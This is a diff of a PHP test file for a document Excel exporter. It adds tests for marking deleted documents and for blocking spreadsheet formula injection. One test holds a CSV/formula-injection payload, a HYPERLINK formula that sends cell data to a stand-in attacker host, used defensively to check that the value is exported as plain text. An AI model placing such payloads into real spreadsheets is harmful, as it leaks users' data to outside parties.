@@ -112,10 +112,63 @@ class DocumentExcelExportTest extends TestCase
 
         $this->assertSame(['Kedaluwarsa', -3], [$byTitle['Kontrak Lewat'][8], $byTitle['Kontrak Lewat'][9]]);
         $this->assertSame(['Aktif', 365], [$byTitle['Kontrak Jauh'][8], $byTitle['Kontrak Jauh'][9]]);
-        $this->assertSame(['Tanpa Masa Tenggang', '', ''], [$byTitle['Akta Tetap'][8], $byTitle['Akta Tetap'][7], $byTitle['Akta Tetap'][9]]);
+        $this->assertSame(['Tanpa Masa Berlaku', '', ''], [$byTitle['Akta Tetap'][8], $byTitle['Akta Tetap'][7], $byTitle['Akta Tetap'][9]]);
         $this->assertNotNull($expired);
         $this->assertNotNull($far);
         $this->assertNotNull($noExpiry);
+    }
+
+    public function test_deleted_documents_are_marked_as_deleted_instead_of_showing_an_expiry_status(): void
+    {
+        $this->document('Kontrak Hidup', '2026-10-19');
+        $deleted = $this->document('Kontrak Dihapus', '2027-10-09', ['document_number' => 'NO-9']);
+        $deleted->delete();
+        $deletedExpired = $this->document('Kontrak Dihapus Lewat', '2026-10-01');
+        $deletedExpired->delete();
+
+        app(DocumentSpreadsheetExporter::class)->write(Document::query()->withTrashed()->orderBy('id'), $this->path);
+
+        $byTitle = collect($this->readSheet()[1])->skip(1)->keyBy(0);
+        $this->assertCount(3, $byTitle);
+        $this->assertSame(['Segera Berakhir', 10], [$byTitle['Kontrak Hidup'][8], $byTitle['Kontrak Hidup'][9]]);
+        $this->assertSame(['Dihapus', ''], [$byTitle['Kontrak Dihapus'][8], $byTitle['Kontrak Dihapus'][9]]);
+        $this->assertSame(['Dihapus', ''], [$byTitle['Kontrak Dihapus Lewat'][8], $byTitle['Kontrak Dihapus Lewat'][9]]);
+        // Tanggal berakhir dan data lain tetap apa adanya; hanya status dan sisa hari yang tidak berlaku untuk dokumen terhapus.
+        $this->assertSame('NO-9', $byTitle['Kontrak Dihapus'][1]);
+        $this->assertSame('2027-10-09', $byTitle['Kontrak Dihapus'][7]->format('Y-m-d'));
+    }
+
+    public function test_free_text_starting_with_an_equals_sign_is_exported_as_text_not_as_a_formula(): void
+    {
+        $payload = '=HYPERLINK("https://attacker.test/?d="&A3,"PT Mitra")';
+        $this->document('=1+1', '2026-10-19', ['counterparty' => $payload, 'document_number' => '=SUM(A1:A9)']);
+
+        app(DocumentSpreadsheetExporter::class)->write(Document::query()->orderBy('id'), $this->path);
+
+        $zip = new \ZipArchive;
+        $this->assertTrue($zip->open($this->path));
+        $sheetXml = $zip->getFromName('xl/worksheets/sheet1.xml');
+        $zip->close();
+        $this->assertStringNotContainsString('<f>', $sheetXml);
+
+        $row = collect($this->readSheet()[1])->skip(1)->first();
+        $this->assertSame(['=1+1', '=SUM(A1:A9)', $payload], [$row[0], $row[1], $row[4]]);
+    }
+
+    public function test_list_export_marks_deleted_documents_when_the_trashed_filter_includes_them(): void
+    {
+        $this->signIn();
+        $this->document('Kontrak Hidup', '2026-10-19');
+        $this->document('Kontrak Dihapus', '2027-10-09')->delete();
+
+        $component = Livewire::test(ListDocuments::class)->filterTable('trashed', true)->callTableAction('exportExcel')->assertFileDownloaded();
+        app(DocumentSpreadsheetExporter::class)->write($component->instance()->getTableQueryForExport(), $this->path);
+        $byTitle = collect($this->readSheet()[1])->skip(1)->keyBy(0);
+        $this->assertSame(['Segera Berakhir', 'Dihapus'], [$byTitle['Kontrak Hidup'][8], $byTitle['Kontrak Dihapus'][8]]);
+
+        $component->filterTable('trashed', null);
+        app(DocumentSpreadsheetExporter::class)->write($component->instance()->getTableQueryForExport(), $this->path);
+        $this->assertSame(['Kontrak Hidup'], collect($this->readSheet()[1])->skip(1)->pluck(0)->all());
     }
 
     public function test_download_response_is_a_private_xlsx_attachment(): void
